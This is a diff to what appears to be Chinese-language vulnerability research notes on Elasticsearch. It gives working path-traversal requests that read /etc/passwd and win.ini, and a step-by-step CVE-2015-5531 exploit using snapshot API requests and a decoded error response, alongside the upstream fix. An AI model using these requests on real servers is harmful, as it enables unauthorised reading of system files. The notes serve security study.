@@ -174,3 +174,35 @@ POC（不能在浏览器访问）
 http://localhost:9200/_plugin/head/../../../../../../../../../etc/passwd
 http://localhost:9200/_plugin/head/../../../../../../../../Windows/win.ini/
 ```
+修复： https://github.com/elastic/elasticsearch/pull/10815/files
+漏洞修复时在`HttpServer.handlePluginSite()`中增加了一条判断`!file.toAbsolutePath().normalize().startsWith(siteFile.toAbsolutePath())`，过滤目录穿越
+
+## CVE-2015-5531
+官方描述此漏洞是`read arbitrary files via unspecified vectors related to snapshot API calls`，查看snapshot的官方文档，所谓快照是一种备份的功能，想要制作快照需要先注册存储库（每个存储库都是独立的，数据不共享），然后在存储库中创建快照。官方给出的这两步的API使用demo如下
+```
+PUT /_snapshot/my_repository
+{
+  "type": "fs",
+  "settings": {
+    "location": "my_backup_location"
+  }
+}
+
+PUT /_snapshot/my_repository/my_snapshot 
+```
+只需要将location后面随意写个存储位置，然后访问如下网址
+```
+GET /_snapshot/my_repository/my_snapshot%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fWindows%2fwin.ini/
+```
+得到如下响应内容
+```
+HTTP/1.1 400 Bad Request
+Content-Type: application/json; charset=UTF-8
+Content-Length: 524
+
+{"error":"ElasticsearchParseException[Failed to derive xcontent from (offset=0, length=92): [59, 32, 102, 111, 114, 32, 49, 54, 45, 98, 105, 116, 32, 97, 112, 112, 32, 115, 117, 112, 112, 111, 114, 116, 13, 10, 91, 102, 111, 110, 116, 115, 93, 13, 10, 91, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 109, 99, 105, 32, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 102, 105, 108, 101, 115, 93, 13, 10, 91, 77, 97, 105, 108, 93, 13, 10, 77, 65, 80, 73, 61, 49, 13, 10]]","status":400}
+```
+将error中的ascii码进行解码，例如可以在chrome的console中利用`String.fromCharCode(ascii)`来解码，得到真实内容
+
+## WooYun-2015-110216
+Ref： http://wooyun.2xss.cc/bug_detail.php?wybug_id=wooyun-2015-0110216
